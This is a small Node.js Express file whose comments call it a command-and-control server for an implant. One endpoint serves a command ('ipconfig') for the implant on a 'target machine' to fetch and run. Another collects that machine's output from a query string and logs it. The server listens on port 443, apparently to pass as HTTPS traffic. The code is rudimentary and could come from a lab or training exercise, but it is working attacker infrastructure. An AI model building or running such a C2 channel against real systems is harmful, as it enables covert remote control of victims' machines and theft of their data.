const express = require('express')
const app = express();
const hostname = '172.31.18.80';
const port = 443;

var command = "ipconfig";

app.get('/', (req, res) => {
	res.send('Hello World');
});

//Used to return the output from the target machine to our C2 server
app.get('/info', (request, response) => {
    if(request.query.info != null){
        var InfoText = request.query.info;
        //InfoText = decodeURI(InfoText);
        console.log(InfoText)
    }
    response.send("Information Sent!")
});

//Used to send out command to the server to be read by the implant
app.get('/retrcommand', (request, response) => {
    response.send(command)

});

app.listen(port, hostname);